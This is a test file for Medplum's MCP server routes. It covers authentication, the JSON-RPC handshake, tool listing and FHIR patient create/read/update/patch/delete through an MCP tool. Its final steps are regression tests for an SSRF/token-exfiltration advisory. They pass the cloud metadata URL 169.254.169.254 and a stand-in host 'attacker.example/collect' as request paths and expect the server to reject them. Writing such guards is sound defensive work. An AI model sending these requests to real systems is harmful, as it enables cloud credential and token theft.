// SPDX-FileCopyrightText: Copyright Orangebot, Inc. and Medplum contributors
// SPDX-License-Identifier: Apache-2.0
import type * as NodeFetch from 'node-fetch';
import { vi } from 'vitest';

// MCP fhir-request uses MedplumClient + node-fetch for in-process HTTP calls.
vi.mock('node-fetch', async () => {
  const actual = await vi.importActual<typeof NodeFetch>('node-fetch');
  return { default: actual.default };
});

import { ContentType, normalizeOperationOutcome } from '@medplum/core';
import type { Bundle, OperationOutcome, Patient } from '@medplum/fhirtypes';
import express from 'express';
import type { Server } from 'http';
import request from 'supertest';
import { initApp, shutdownApp } from '../app';
import { loadTestConfig } from '../config/loader';
import { initTestAuth } from '../test.setup';

describe('MCP Routes', () => {
  const app = express();
  let accessToken: string;
  let server: Server;
  let port: number;

  beforeAll(async () => {
    const config = await loadTestConfig();
    config.mcpEnabled = true;

    await initApp(app, config);
    accessToken = await initTestAuth();

    server = await new Promise<Server>((resolve) => {
      const s = app.listen(0, () => resolve(s));
    });

    const address = server.address();
    if (!address || typeof address === 'string') {
      throw new Error('Could not determine server address');
    }
    port = address.port;

    config.baseUrl = `http://localhost:${port}/`;
  });

  afterAll(async () => {
    await new Promise<void>((resolve, reject) => {
      server.close((err) => (err ? reject(err) : resolve()));
    });
    await shutdownApp();
  }, 30_000);

  test('Unauthenticated streamable HTTP', async () => {
    const res = await request(app).get('/mcp/stream');
    expect(res).toHaveStatus(401);
  });

  test.each(['get', 'post'] as const)('SSE transport removed (%s)', async (method) => {
    const agent = request(app);
    const res = await agent[method]('/mcp/sse').set('Authorization', 'Bearer ' + accessToken);
    expect(res).toHaveStatus(410);
    expect(res.body.message).toContain('/mcp/stream');
  });

  describe('MCP with streamable HTTP transport', () => {
    // Sends one JSON-RPC request to /mcp/stream and returns its `result`.
    async function rpc(method: string, params?: Record<string, unknown>): Promise<any> {
      const res = await request(app)
        .post('/mcp/stream')
        .set('Authorization', 'Bearer ' + accessToken)
        .set('Content-Type', ContentType.JSON)
        .set('Accept', `${ContentType.JSON}, ${ContentType.EVENT_STREAM}`)
        .send({ jsonrpc: '2.0', id: 1, method, params });
      expect(res).toHaveStatus(200);
      expect(res.body.error).toBeUndefined();
      return res.body.result;
    }

    test('Initialize handshake', async () => {
      const result = await rpc('initialize', {
        protocolVersion: '2025-11-25',
        capabilities: {},
        clientInfo: { name: 'example-client', version: '1.0.0' },
      });
      expect(result).toMatchObject({
        protocolVersion: '2025-11-25',
        capabilities: { tools: {} },
        serverInfo: { name: 'medplum' },
      });
    });

    test('Tool discovery and invocation', async () => {
      const tools = await rpc('tools/list');
      expect(tools).toMatchObject({
        tools: [{ name: 'search' }, { name: 'fetch' }, { name: 'fhir-request' }],
      });

      const searchToolResult = await rpc('tools/call', { name: 'search', arguments: { query: 'example' } });
      expect(searchToolResult).toBeDefined();

      const fetchToolResult = await rpc('tools/call', { name: 'fetch', arguments: { id: 'example-id' } });
      expect(fetchToolResult).toBeDefined();

      // Convenience method to make FHIR requests
      async function fhirRequest<T>(method: string, path: string, body?: any): Promise<T> {
        const mcpResult = await rpc('tools/call', { name: 'fhir-request', arguments: { method, path, body } });
        const json = mcpResult.content?.[0]?.text;
        try {
          return JSON.parse(json);
        } catch (err) {
          return normalizeOperationOutcome(err) as T;
        }
      }

      // 1. create
      const createResult = await fhirRequest<Patient>('POST', 'Patient', {
        resourceType: 'Patient',
        name: [{ family: 'Doe', given: ['John'] }],
      });
      expect(createResult.resourceType).toBe('Patient');

      // 2. read
      const readResult = await fhirRequest<Patient>('GET', `Patient/${createResult.id}`);
      expect(readResult.id).toBe(createResult.id);

      // 3. update
      const updateResult = await fhirRequest<Patient>('PUT', `Patient/${createResult.id}`, {
        ...createResult,
        address: [{ line: ['123 Main St'], city: 'Springfield', state: 'IL', postalCode: '62701' }],
      });
      expect(updateResult.address).toBeDefined();
      expect(updateResult.address?.[0].line).toEqual(['123 Main St']);

      // 4. patch
      const patchedResult = await fhirRequest<Patient>('PATCH', `Patient/${updateResult.id}`, [
        { op: 'test', path: '/meta/versionId', value: updateResult.meta?.versionId },
        { op: 'add', path: '/telecom', value: [{ system: 'phone', value: '555-1234' }] },
      ]);
      expect(patchedResult.telecom).toBeDefined();
      expect(patchedResult.telecom?.[0].value).toBe('555-1234');

      // 5. search
      const searchResult = await fhirRequest<Bundle<Patient>>('GET', 'Patient');
      expect(searchResult.resourceType);
      expect(searchResult.entry?.some((e) => e.resource?.id === createResult.id)).toBeTruthy();

      // 6. delete
      const deleteResult = await fhirRequest<OperationOutcome>('DELETE', `Patient/${createResult.id}`);
      expect(deleteResult.id).toBe('ok');

      // 7. unknown method
      const unknownMethodResult = await fhirRequest<OperationOutcome>('UNKNOWN', `Patient/${createResult.id}`);
      expect(unknownMethodResult.issue?.[0].severity).toBe('error');

      // 8. SSRF / token-exfiltration guard (GHSA-fjgc-c3pj-xx2c): an absolute or off-origin
      // `path` is rejected before any outbound fetch, for every method. (Relative paths are
      // already proven to work by steps 1-6 above.)
      for (const m of ['GET', 'POST', 'PUT', 'PATCH', 'DELETE']) {
        const ssrf = await fhirRequest<OperationOutcome>(m, 'http://169.254.169.254/latest/meta-data/', {});
        expect(ssrf.issue?.[0].severity).toBe('error');
      }

      // 9. Token-exfiltration vector: external https host is blocked even though it is not an internal IP.
      const exfil = await fhirRequest<OperationOutcome>('GET', 'https://attacker.example/collect');
      expect(exfil.issue?.[0].severity).toBe('error');

      // 10. Protocol-relative path resolves to the server's own origin (harmless), so it does not
      // reach an external host; it is handled as an ordinary same-origin FHIR request.
      const protoRel = await fhirRequest<OperationOutcome>('GET', '//169.254.169.254/latest/meta-data/');
      expect(protoRel.resourceType).toBe('OperationOutcome');
    });
  });
});
